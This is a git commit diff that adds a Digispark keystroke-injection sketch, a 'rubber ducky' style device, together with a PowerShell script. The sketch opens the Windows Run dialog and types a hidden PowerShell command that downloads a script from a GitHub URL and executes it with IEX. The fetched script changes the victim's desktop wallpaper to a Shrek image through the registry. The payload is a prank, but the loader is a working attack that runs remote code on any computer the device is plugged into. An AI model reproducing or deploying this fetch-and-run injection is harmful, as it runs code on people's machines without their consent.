f4ee3900ea2fd3ea72c60a3a25d57816d3a69bfc
NoobleMcScrunchkin <kieranaslett@gmail.com>
2019-02-05 12:11:16 +0000

    sadf

---
+++ walllpaper/walllpaper.ino
@@ -0,0 +1,14 @@
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+ DigiKeyboard.sendKeyStroke(0);
+ DigiKeyboard.delay(500);
+ DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+ DigiKeyboard.delay(500);
+ DigiKeyboard.print("powershell.exe -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/wallpaper.ps1');");
+ DigiKeyboard.sendKeyStroke(KEY_ENTER);
+ for (;;) {
+}
+}
--- wallpaper.ps1
+++ wallpaper.ps1
@@ -1,4 +1,4 @@
- Invoke-WebRequest https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/shrek.jpg -OutFile "C:\shrek.jpg"
- reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\shrek.jpg /f
- Start-Sleep -s 10
- rundll32.exe user32.dll, UpdatePerUserSystemParameters, 0, $false
+Invoke-WebRequest https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/shrek.jpg -OutFile ($env:USERPROFILE + "\shrek.jpg")
+set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value ($env:USERPROFILE + "\shrek.jpg")
+Start-Sleep -s 10
+rundll32.exe user32.dll, UpdatePerUserSystemParameters
